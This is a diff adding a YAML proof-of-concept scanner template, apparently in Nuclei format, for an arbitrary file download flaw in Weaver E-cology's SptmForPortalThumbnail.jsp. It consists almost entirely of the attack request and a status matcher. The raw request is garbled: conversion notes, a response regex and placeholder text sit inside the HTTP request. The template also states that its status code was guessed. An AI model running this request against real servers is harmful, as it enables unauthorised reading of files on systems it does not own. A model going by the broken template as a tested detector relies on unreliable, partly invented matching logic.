@@ -1,0 +1,36 @@
+id: poc-mfp4hqk2g60lmfb6
+info:
+  name: 泛微 E-cology SptmForPortalThumbnail.jsp 存在任意文件下载漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mfp4hqk2g60lmfb6
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: lfi,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: mfp4hqk2g60lmfb6
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    ^(?=.*?java.io)(?=.*?imgFile.exists)(?=.*?Thumbnail).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
